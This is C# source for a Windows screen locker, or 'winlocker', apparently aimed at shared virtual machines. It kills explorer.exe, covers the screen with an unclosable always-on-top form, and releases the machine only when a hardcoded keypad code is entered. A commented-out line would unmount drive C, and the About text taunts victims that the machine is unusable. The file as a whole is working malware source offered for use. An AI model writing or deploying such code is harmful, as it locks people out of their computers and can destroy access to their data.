using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace shittywinlock {
    public partial class Form1 : Form {

        string pravelniiCod = "73556087355608123";
        public Form1() {
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            TopMost = true;
//          Registry.CurrentUser.CreateSubKey(@"");
            InitializeComponent();
            System.Diagnostics.Process.Start("taskkill.exe", "/f /im explorer.exe");
//          System.Diagnostics.Process.Start("CMD.exe", "mountvol C: /d");
        }

        private void typedPravCod() {
            System.Diagnostics.Process.Start("explorer.exe");
            Application.Exit();
        }

        private void button1_Click(object sender, EventArgs e) {
            label4.Text += "1";
        }

        private void button2_Click(object sender, EventArgs e) {
            label4.Text += "2";
        }

        private void button3_Click(object sender, EventArgs e) {
            label4.Text += "3";
        }

        private void button4_Click(object sender, EventArgs e) {
            label4.Text += "4";
        }

        private void button5_Click(object sender, EventArgs e) {
            label4.Text += "5";
        }

        private void button6_Click(object sender, EventArgs e) {
            label4.Text += "6";
        }

        private void button7_Click(object sender, EventArgs e) {
            label4.Text += "7";
        }

        private void button8_Click(object sender, EventArgs e) {
            label4.Text += "8";
        }

        private void button9_Click(object sender, EventArgs e) {
            label4.Text += "9";
        }

        private void button10_Click(object sender, EventArgs e) {
            label4.Text += "0";
        }

        private void button11_Click(object sender, EventArgs e) { // clear
            label4.Text = "";
        }

        private void button12_Click(object sender, EventArgs e) { // basically enter button
            if (label4.Text == pravelniiCod) {
                typedPravCod();
            } 
            else {
                label4.Text = "";
                label3.Text = "Неправельный код! Not corect cod\nCod : ";
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e) {
            e.Cancel = true;
        }

        private void button13_Click(object sender, EventArgs e) {
            MessageBox.Show("If you see this running, most probably a forkie or a ratfag was here before. This VM is no longer usable, do a vote reset", "About", MessageBoxButtons.OK);
        }
    }
}
